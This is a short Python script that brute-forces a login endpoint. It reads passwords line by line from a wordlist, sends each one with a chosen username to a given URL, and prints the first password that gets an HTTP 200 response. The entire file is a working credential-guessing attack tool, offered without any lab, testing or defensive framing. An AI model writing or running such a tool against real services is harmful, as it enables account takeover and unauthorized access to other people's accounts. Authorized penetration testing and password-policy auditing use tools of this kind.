import requests
import argparse

parser = argparse.ArgumentParser(description="Brute force password checker from a text file.")
parser.add_argument("-file", type=str, required=True, help="Path to the password file")
parser.add_argument("-url", type=str, required=True, help="URL of the login endpoint")
parser.add_argument("-username", type=str, required=True, help="Username for the login")
args = parser.parse_args()

password_file = args.file
url = args.url
username = args.username

headers = {
    "Content-Type": "application/json"
}

with open(password_file, 'r') as file:
    for line in file:
        password = line.strip()  

        payload = {
            "username": username,
            "password": password
        }

        try:
            response = requests.get(url, json=payload, headers=headers, timeout=1)

            if response.status_code == 200:
                print(f"Login successful with password: {password}")
                exit()

            print(f"\rCurrent password attempt: {password}", end='')

        except requests.RequestException as e:
            print(f"\nRequest error: {e}")
            continue

print("\nAll attempts failed.")
